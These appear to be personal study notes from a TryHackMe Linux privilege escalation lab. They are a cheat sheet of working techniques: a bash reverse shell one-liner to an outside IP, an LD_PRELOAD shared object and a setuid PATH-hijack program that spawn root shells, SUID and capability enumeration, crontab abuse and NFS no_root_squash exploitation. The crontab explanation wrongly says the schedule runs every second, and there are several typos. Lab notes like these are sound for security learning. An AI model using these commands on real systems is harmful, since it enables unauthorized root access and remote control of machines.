[Try Hack Me - linuxPrivEsc] 

Privillage Escallation

Nathan Hailu , Sat 23 Apr 2022 06:52:26 AM EDT


===========commands===================
> to check if program exists
		- which $yourprogram
> to give sudo -l access
	add the following in sudoers file udner #includedir
		- username ALL=(ALL:ALL) /usr/bin/pico
> shell commands
	  - python -c 'import pty; pty.spawn("/bin/sh")'
	  - export TERM=xterm
> Bash NC command
		- bash -i >& /dev/tcp/10.0.0.1/8080 0>&1	  
1) Kernel exploit

	-Find The kernel Version on ExploitDB if you got any exploits
-----------------------------------------------------------------

2) LD-preload

  -LD_PRELOAD is a function that allows any program to use shared libraries
	~ sudo -l  -> find text "env_keep+=LD_PRELOAD"
	~ Write a simple C code compiled as a share object (.so extension) file
				#include <stdio.h>
				#include <sys/types.h>
				#include <stdlib.h>

				void _init() {
				unsetenv("LD_PRELOAD");
				setgid(0);
				setuid(0);
				system("/bin/bash");
				}		 
	~ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
	~ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
-----------------------------------------------------------------	
3) SUID vuln

	~ find / -type f -perm -04000 -ls 2>/dev/null
		-> The programs listed in the result of the aboves program can excute any thing with out root for exploiting Commands Check [GFObins] site under SUID vuln. 
-----------------------------------------------------------------
4) Capabilities
	
	~ getcap -r / 2>dev/null
		-> The programs listed in the result of the aboves program can excute any thing with out root for exploiting Commands Check [GFObins] site under Capabilities. 
-----------------------------------------------------------------
5) crontab
	~ cat /etc/crontab
	  -> programs listed with 
	  			" * * * * * root /home/$myprogram" 
	  					means will run myprogram with root access everysecond. so changing the content of my program to a reverse shell exploit will give as a access. 
-----------------------------------------------------------------
6) PATH exploiting

	~ create a c program in your home, with name "path"
			#include<unistd.h>
			void main()
			{ setuid(0);
				setgid(0);
				system("somefile");
			}
		~ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u    -> Will give you foldernames that is writtable
	~ export PATH=/yourfolder:$PATH
	~ make a bash program in $yourfolder
			echo "/bin/bash" > somefile
			chmod 777 somefile
	~ run your 1st code "./path"

-----------------------------------------------------------------
7) NFS(Network File Sharing) server Exploit
	
	~ cat /etc/exports  -> check if there is folder with"no_root_squash"
	* showmount -e $VictimIP -> will show you folders "folderNFS"
	* mkdir /tmp/victimfiles
	* mount -o rw $VictimIP:/folderNFS /tmp/victimfiles
	* Create a c script for reverse shell gaining
	* compile it with gcc
	*	give it permission(+s)
	~ exeute the script from victim shell

-----------------------------------------------------------------